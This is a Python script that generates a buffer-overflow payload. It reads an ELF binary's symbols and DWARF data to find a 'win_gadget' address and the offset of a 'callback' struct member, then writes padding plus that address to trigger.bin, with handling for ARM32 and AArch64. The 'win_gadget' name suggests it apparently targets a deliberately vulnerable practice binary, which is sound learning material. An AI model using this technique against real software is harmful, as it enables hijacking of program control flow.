import struct
import sys
from elftools.elf.elffile import ELFFile
from elftools.elf.sections import SymbolTableSection

def get_symbol_address(elf, symbol_name):
    """Search for a symbol in the ELF symbol table."""
    print (f'[+] getting gadget address for \'{symbol_name}\'  from {elf}')

    for section in elf.iter_sections():
        if isinstance(section, SymbolTableSection):
            for symbol in section.iter_symbols():
                # Handle cases where symbols might be prefixed (e.g., _win_gadget)
                if symbol.name == symbol_name or symbol.name == f"_{symbol_name}":
                    return symbol['st_value']
    return None

def get_struct_offset(elf):
    """Retrieve the 'callback' member offset using DWARF data."""
    if not elf.has_dwarf_info():
        print("[!] No DWARF info found. Falling back to default offset 0x40.")
        return 0x40
    
    dwarf = elf.get_dwarf_info()
    for cu in dwarf.iter_CU():
        for die in cu.iter_DIEs():
            if die.tag == 'DW_TAG_member':
                name = die.attributes.get('DW_AT_name')
                if name and b'callback' in name.value:
                    return die.attributes['DW_AT_data_member_location'].value
    return 0x40

def generate(bin_path):
    with open(bin_path, 'rb') as f:
        elf = ELFFile(f)
        arch = elf.get_machine_arch()
        
        # 1. Resolve win_gadget address natively
        addr = get_symbol_address(elf, "win_gadget")
        if not addr:
            #try to get it from the export table. 


            print(f"[!] Error: Could not find 'win_gadget' symbol in {bin_path}")
            sys.exit(1)
            
        # 2. Get struct offset
        offset = get_struct_offset(elf)
        
        # 3. Handle Thumb tagging for ARM32
        if arch == 'ARM' and "thumb" in bin_path:
            addr |= 1
            print(f"[*] Thumb mode detected. Tagging address: {hex(addr)}")
            
        # 4. Pack payload (8 bytes for AArch64, 4 bytes for ARM32)
        fmt = "<Q" if arch == 'AArch64' else "<I"
        payload = b"A" * offset + struct.pack(fmt, addr)
        
        with open("trigger.bin", "wb") as out:
            out.write(payload)
            
        print(f"[+] Payload generated for {arch} at offset {hex(offset)} (Target: {hex(addr)})")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 gen_payload.py <binary>")
        sys.exit(1)
    generate(sys.argv[1])
